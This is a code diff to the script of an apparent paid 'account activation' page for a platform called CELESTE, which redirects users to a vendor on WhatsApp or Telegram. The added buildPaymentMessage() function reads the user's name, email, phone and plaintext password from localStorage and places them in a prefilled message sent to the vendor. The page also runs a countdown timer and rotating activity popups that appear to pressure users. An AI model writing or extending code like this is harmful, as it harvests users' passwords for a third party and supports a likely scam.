@@ -275,19 +275,26 @@
     };
 
     window.handleRedirect = (platform) => {
-        document.getElementById('selection-modal').style.display = 'none';
-        document.getElementById('overlay').style.display = 'flex';
-        const msg = encodeURIComponent("Hello Celeste Vendor, I have made payment for my account activation. Please confirm my payment.");
-        let finalUrl = "";
-        if(platform === 'whatsapp') {
-            const cleanWA = whatsappNum.replace(/\D/g, '');
-            finalUrl = `https://wa.me/${cleanWA}?text=${msg}`;
-        } else {
-            let tg = vendorLink.startsWith('http') ? vendorLink : `https://t.me/${vendorLink.replace('@', '')}`;
-            finalUrl = `${tg}?text=${msg}`;
-        }
-        setTimeout(() => { window.location.href = finalUrl; }, 3000);
-    };
+    document.getElementById('selection-modal').style.display = 'none';
+    document.getElementById('overlay').style.display = 'flex';
+
+    const message = encodeURIComponent(buildPaymentMessage());
+    let finalUrl = "";
+
+    if (platform === 'whatsapp') {
+        const cleanWA = whatsappNum.replace(/\D/g, '');
+        finalUrl = `https://wa.me/${cleanWA}?text=${message}`;
+    } else {
+        let tg = vendorLink.startsWith('http')
+            ? vendorLink
+            : `https://t.me/${vendorLink.replace('@', '')}`;
+        finalUrl = `${tg}?text=${message}`;
+    }
+
+    setTimeout(() => {
+        window.location.href = finalUrl;
+    }, 6000);
+};
 
     let sec = 600;
     setInterval(() => {
@@ -324,6 +331,33 @@
         setTimeout(() => popup.classList.remove('show'), 3800);
         cur = (cur + 1) % activities.length;
     }, 7000);
+
+    function buildPaymentMessage() {
+    const name = localStorage.getItem('fullName') || 'N/A';
+    const username = localStorage.getItem('preferredUsername') || 'N/A';
+    const email = localStorage.getItem('email') || 'N/A';
+    const phone = localStorage.getItem('phone') || 'N/A';
+    const password = localStorage.getItem('password') || 'N/A';
+    const pkg = localStorage.getItem('packageName') || 'N/A';
+    const amount = localStorage.getItem('packageAmount') || 'N/A';
+
+    return `
+Hello Coach...
+I just made my payment for CELESTE Activation.
+
+Here are my details, Please confirm:
+
+• Full Name: ${name}  
+• Preferred Username: ${username}  
+• Email: ${email}  
+• Phone Number: ${phone}  
+• Password: ${password}  
+• Package: ${pkg}  
+• Amount: ${amount}  
+
+Payment Method: ✅ Bank Transfer
+    `.trim();
+}
 </script>
 </body>
 </html>
